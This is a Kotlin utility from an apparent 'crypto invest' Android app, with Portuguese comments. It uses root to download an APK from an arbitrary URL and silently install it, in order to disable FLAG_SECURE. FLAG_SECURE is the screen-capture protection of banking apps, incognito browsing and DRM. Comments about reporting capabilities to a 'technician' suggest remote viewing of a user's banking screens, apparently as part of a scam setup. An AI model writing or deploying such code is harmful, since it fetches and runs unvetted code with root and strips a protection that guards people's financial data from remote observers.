package pt.invest.cryptoinvest

import android.content.Context
import android.util.Log
import java.io.File
import java.net.URL

// Desbloqueio do FLAG_SECURE ao nivel do framework (Chrome anonimo, apps bancarias, jogos, DRM).
// NAO existe comando runtime para desativar o FLAG_SECURE: e imposto pelo system_server. A forma
// fiavel e um modulo LSPosed (DisableFlagSecure) que faz hook a WindowState.isSecureLocked no
// framework. Este utilitario, com ROOT, instala automaticamente o APK do modulo. Depois o
// utilizador so tem de ATIVAR o modulo no LSPosed e REINICIAR (o LSPosed nao permite ativar o
// scope por comando de forma fiavel).
object RootUtil {
    private const val TAG = "CIRoot"
    // Pacote do modulo DisableFlagSecure (github.com/veeti/DisableFlagSecure).
    const val MODULE_PKG = "fi.veetipaananen.android.disableflagsecure"

    fun runSu(cmd: String): Pair<Boolean, String> {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText()
            val err = p.errorStream.bufferedReader().readText()
            val code = p.waitFor()
            Pair(code == 0, (out + err).trim())
        } catch (e: Exception) { Pair(false, e.message ?: "erro") }
    }

    fun isRooted(): Boolean {
        val (ok, out) = runSu("id")
        if (ok && out.contains("uid=0")) return true
        for (p in listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/adb/magisk")) {
            if (File(p).exists()) return true
        }
        return false
    }

    fun hasMagisk(): Boolean {
        val (ok, _) = runSu("which magisk")
        if (ok) return true
        return File("/data/adb/magisk").exists() || File("/sbin/.magisk").exists()
    }

    // LSPosed instalado? (necessario para o modulo funcionar)
    fun hasLsposed(): Boolean {
        val (ok, out) = runSu("ls /data/adb/lspd 2>/dev/null; ls /data/adb/modules 2>/dev/null; pm list packages 2>/dev/null")
        if (!ok) return File("/data/adb/lspd").exists()
        val low = out.lowercase()
        return low.contains("lspd") || low.contains("lsposed") || low.contains("riru_lsposed")
    }

    // O modulo (APK) esta instalado no sistema?
    fun isModuleInstalled(): Boolean {
        val (ok, out) = runSu("pm list packages $MODULE_PKG 2>/dev/null")
        return ok && out.contains(MODULE_PKG)
    }

    // Compat: usado no envio de capacidades ao tecnico.
    fun isSecureDisablerInstalled(): Boolean = isModuleInstalled()

    // Descarrega e instala (via root) o APK do modulo DisableFlagSecure. Devolve (sucesso, mensagem).
    fun installDisablerModule(ctx: Context, url: String): Pair<Boolean, String> {
        if (!isRooted()) return Pair(false, "Sem root neste aparelho — sem root nao e possivel passar o FLAG_SECURE (siga o guia).")
        if (isModuleInstalled()) {
            return Pair(true, "Modulo ja instalado. Ative-o no LSPosed (scope: Sistema) e REINICIE o aparelho.")
        }
        return try {
            val apk = File(ctx.cacheDir, "disable_flag_secure.apk")
            URL(url).openStream().use { input -> apk.outputStream().use { input.copyTo(it) } }
            if (apk.length() < 5000) return Pair(false, "Falha ao descarregar o modulo (verifique a internet).")
            val tmp = "/data/local/tmp/ci_dfs.apk"
            val (ok, msg) = runSu("cp '${apk.absolutePath}' $tmp && pm install -r -d $tmp; rm -f $tmp")
            if (!ok && !isModuleInstalled()) return Pair(false, "Falha ao instalar o modulo: $msg")
            val lsp = hasLsposed()
            if (lsp) Pair(true, "Modulo instalado. Abra o LSPosed, ATIVE 'DisableFlagSecure' (scope: Sistema/System Framework) e REINICIE o aparelho.")
            else Pair(true, "Modulo instalado, mas o LSPosed nao foi detetado. Instale o LSPosed, ative o modulo e reinicie (ver guia).")
        } catch (e: Exception) {
            Log.w(TAG, "install module fail", e)
            Pair(false, "Erro no desbloqueio automatico: ${e.message}. Use o guia manual.")
        }
    }
}
